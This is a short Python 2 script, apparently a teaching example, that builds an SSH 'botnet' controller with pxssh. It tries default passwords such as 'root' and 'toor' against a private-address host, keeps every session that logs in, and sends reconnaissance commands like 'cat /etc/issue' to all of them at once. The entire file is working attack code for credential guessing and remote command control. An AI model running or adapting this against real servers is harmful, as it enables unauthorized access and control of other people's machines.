#!/usr/bin/env python

import optparse
import pxssh

class ClientBot:
  def __init__(self, host, user, password):
    self.host = host
    self.user = user
    self.password = password
    self.session = None
    self.logged_in = False
  
  def login(self):
    try:
      self.session = pxssh.pxssh()
      self.session.login(self.host, self.user, self.password)
      self.logged_in = True
    except Exception, e:
      print e
      print '[-] Error Connecting'

  def send_command(self, cmd):
    self.session.sendline(cmd)
    self.session.prompt()
    return self.session.before

class BotNet:
  def __init__(self, host, user):
    self.host = host
    self.user = user
    self.bots = []

  def send_command(self, command):
    for bot in self.bots:
      if bot.logged_in:
        output = bot.send_command(command)
        print '[*] Output from ' + bot.host
        print '[+] ' + output + '\n'

  def add_client(self, password):
    bot = ClientBot(self.host, self.user, password)
    self.bots.append(bot)

  def login_bots(self):
    for bot in self.bots:
      bot.login()


def main(host, user):
  botNet = BotNet(host, user)
  botNet.add_client('root')
  botNet.add_client('toor')

  botNet.login_bots()

  botNet.send_command('uname -v')
  botNet.send_command('cat /etc/issue')

if __name__ == '__main__':
  main("10.0.1.7", "marcel")